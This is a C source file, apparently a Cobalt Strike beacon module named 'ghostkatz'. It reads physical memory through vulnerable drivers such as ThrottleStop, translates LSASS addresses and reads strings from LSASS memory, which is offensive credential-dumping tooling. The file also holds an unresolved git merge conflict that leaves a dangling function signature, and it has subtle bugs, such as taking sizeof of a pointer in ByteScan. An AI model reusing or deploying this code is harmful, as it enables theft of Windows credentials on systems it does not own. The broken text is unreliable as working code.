#include <windows.h>

#include "beacon.h"
#include "ghostkatz.h"
#include "provider.h"
#include "defs.h"


<<<<<<< HEAD
BOOL WriteByte(HANDLE hFile, ULONG_PTR PhysicalAddress, BYTE WriteValue)
=======
char* GetWinBuildNumber()
{
    static char g_BuildStr[32];  // persists after return
    DWORD cbData = sizeof(g_BuildStr);
    g_BuildStr[0] = '\0';

    LONG st = RegGetValueA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        "CurrentBuildNumber",
        RRF_RT_REG_SZ,
        NULL,
        (PVOID)g_BuildStr,
        &cbData
    );

    if (st != ERROR_SUCCESS) 
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to get Windows build number (err=%ld)\n", st);
        return NULL;
    }

    return g_BuildStr;
}

BOOL GetWinVersion(char* pvWindowsVersion, int size)
{
    LSTATUS status;
    DWORD cbData = size;
    status = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", RRF_RT_REG_SZ, NULL, pvWindowsVersion, &cbData);
    if (status == ERROR_FILE_NOT_FOUND)
    {
        cbData = size;
        status = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", RRF_RT_REG_SZ, NULL, pvWindowsVersion, &cbData);
    }

    if (status != ERROR_SUCCESS)
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to get Windows version!\n");
        return FALSE;
    }

    return TRUE;
}

BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue, int provId)
>>>>>>> 8eda89b (Propagate provider ID through all memory read helpers and call sites)
{
    typedef BOOL(NTAPI* fnDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    fnDeviceIoControl pDeviceIoControl = (fnDeviceIoControl)GetProcAddress(GetModuleHandleA("kernel32.dll"), "DeviceIoControl");

    if (!pDeviceIoControl) return FALSE;

    PROVIDER_INFO* prov_info = GetProviderInfo(provId);
    if (!prov_info) return FALSE;

    DWORD bytesReturned = 0;
    BOOL result = FALSE;

    switch (provId)
    {
        case PROVIDER_TPWSAV:
        {
            #pragma pack(push, 1)
            typedef struct _TPW_PHYSICAL_READ_REQUEST {
                UINT64 PhysicalAddr;
                BYTE ReadValue;
            } TPW_PHYSICAL_READ_REQUEST;
            #pragma pack(pop)

            TPW_PHYSICAL_READ_REQUEST request = { 0 };
            request.PhysicalAddr = (UINT64)PhysicalAddress;

            result = pDeviceIoControl(hFile, prov_info->read_ioctl, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
            if (result) {
                *ReadValue = request.ReadValue;
                return TRUE;
            }
            break;
        }

        case PROVIDER_THROTTLESTOP:
        {
            UINT64 inputAddr = (UINT64)PhysicalAddress;
            BYTE outputByte = 0;

            result = pDeviceIoControl(hFile, prov_info->read_ioctl, &inputAddr, sizeof(inputAddr), &outputByte, sizeof(outputByte), &bytesReturned, NULL);
            if (result && bytesReturned >= 1) {
                *ReadValue = outputByte;
                return TRUE;
            }
            break;
        }

        case PROVIDER_LNVMSRIO:
        {
            typedef struct _LNVMSRIO_PHYSICAL_READ_REQUEST {
                UINT64 PhysicalAddress;
                DWORD  OperationWidth;   
                DWORD  NumBytes;            
            } LNVMSRIO_PHYSICAL_READ_REQUEST;

            LNVMSRIO_PHYSICAL_READ_REQUEST request = { 0 };
            BYTE outputByte = 0;

            request.PhysicalAddress = (UINT64)PhysicalAddress;
            request.OperationWidth = 1;
            request.NumBytes = 1;      

            result = pDeviceIoControl(hFile, 
                                     prov_info->read_ioctl, 
                                     &request, sizeof(request), 
                                     &outputByte, sizeof(outputByte), 
                                     &bytesReturned, NULL);

            if (result && bytesReturned >= 1) {
                *ReadValue = outputByte;
                return TRUE;
            }
            break;
        }

        default:
            return FALSE;
    }

    return FALSE;
}

unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 PhysicalAddress, BOOL Forwards, int provId)
{
    unsigned char* ByteArray = (unsigned char*)malloc(NumberOfBytesToRead * sizeof(unsigned char));
    int j = 0;
    BYTE ReadValue = 0;
    if (Forwards)
    {
        for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + NumberOfBytesToRead; i++)
        {
            ReadByte(hFile, i, &ReadValue, provId);
            ByteArray[j] = ReadValue;
            j++;
        }
    }
    else
    {
        for (DWORD64 i = PhysicalAddress + NumberOfBytesToRead - 1; i >= PhysicalAddress; i--)
        {
            ReadByte(hFile, i, &ReadValue, provId);
            ByteArray[j] = ReadValue;
            j++;
        }
    }

    return ByteArray;
}

DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBytesToRead, DWORD64 PhysicalAddress, int provId)
{
    int ArraySize = sizeof(TargetByteArray) - 1;
    int arrayCounter = 0;

    unsigned char* InternalByteArray = (unsigned char*)malloc(ArraySize * sizeof(char));
    DWORD PhysicalAddressWhereByteArrayFound = 0;
    BYTE readByteValue = 0;

    for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + MaxNumberOfBytesToRead; i++)
    {
        ReadByte(hFile, i, &readByteValue, provId);
        InternalByteArray[arrayCounter] = readByteValue;

        if (arrayCounter == ArraySize - 1)
        {
            PhysicalAddressWhereByteArrayFound = i - ArraySize;
            break;
        }


        if (TargetByteArray[arrayCounter] == 0x90)
        {
            arrayCounter++;
        }
        else if (InternalByteArray[arrayCounter] != TargetByteArray[arrayCounter])
        {
            arrayCounter = 0;
        }
        else
        {
            arrayCounter++;
        }
    }
    free(InternalByteArray);

    return PhysicalAddressWhereByteArrayFound;
}


// Very similar to the ReadMultipleBytes function but we need it to go backwards to read address correctly
DWORD64 ReadAddressAtPhysicalAddressLocation(HANDLE hFile, DWORD64 PhysicalAddress, int provId)
{
    BYTE value = 0;
    DWORD64 address = 0;
    for (DWORD64 i = PhysicalAddress + 7; i >= PhysicalAddress; i--)
    {
        ReadByte(hFile, i, &value, provId);
        address = (address << 8);
        address += value;
    }
    return address;
}

wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStructPA, DWORD lower32bits, int LsassPID, int provId)
{
    /*
      typedef struct _UNICODE_STRING {
      USHORT Length;         // Offset 0 (2 bytes)
      USHORT MaximumLength;  // Offset 2 (2 bytes)
                             // 4 bytes invisible padding
      PWSTR  Buffer;         // Offset 8 (8 bytes)
    } UNICODE_STRING, *PUNICODE_STRING;
    */

    // It is a UNICODE_STRING struct so we have to get the string length at the first byte,
    // and the pointer to the string will start at 0x8

    // Get length
    BYTE UnicodeStringLength = 0;
    ReadByte(hFile, UnicodeStringStructPA + 0x2, &UnicodeStringLength, provId); // the 0x2 is to get the max length of the unicode string

    // Get address to the wide string
    DWORD64 UnicodeStringPA = 0;
    DWORD64 pUnicodeStringVA = ReadAddressAtPhysicalAddressLocation(hFile, UnicodeStringStructPA + 0x8, provId);
    TranslateUVA2Physical(pUnicodeStringVA, &UnicodeStringPA, lower32bits, LsassPID);

    // Read wide string & store string properly
    wchar_t* UnicodeString = (wchar_t*)malloc(UnicodeStringLength * sizeof(wchar_t));
    int j = 0;
    BYTE ReadValueLow = 0;
    BYTE ReadValueHigh = 0;
    for (DWORD64 i = UnicodeStringPA; i < UnicodeStringPA + UnicodeStringLength; i += 2)
    {
        ReadByte(hFile, i, &ReadValueLow, provId);
        ReadByte(hFile, i + 1, &ReadValueHigh, provId);
        UnicodeString[j] = (wchar_t)(ReadValueLow | ReadValueHigh << 8);
        j++;
    }
    UnicodeString[j] = L'\0';


    return UnicodeString;
}


BOOL PrintHex(unsigned char* ByteArray, int ByteArraySize)
{    
    for (int i = 0; i < ByteArraySize; i++)
    {
        BeaconFormatPrintf(&outputbuffer, "%02x", (unsigned int)ByteArray[i]);
    }
    BeaconFormatPrintf(&outputbuffer, "\n");

    return TRUE;
}


DWORD SearchPattern(unsigned char* mem, DWORD NumOfBytesToSearch, unsigned char* signature, DWORD signatureLen)
{
    ULONG offset = 0;

    // Hunt for signature locally to avoid a load of DeviceIoControl calls
    for (int i = 0; i < NumOfBytesToSearch; i++) {
        if (*(unsigned char*)(mem + i) == signature[0] && *(unsigned char*)(mem + i + 1) == signature[1]) {
            if (memcmp(mem + i, signature, signatureLen) == 0) {
                // Found the signature
                offset = i;
                break;
            }
        }
    }

    return offset;
}
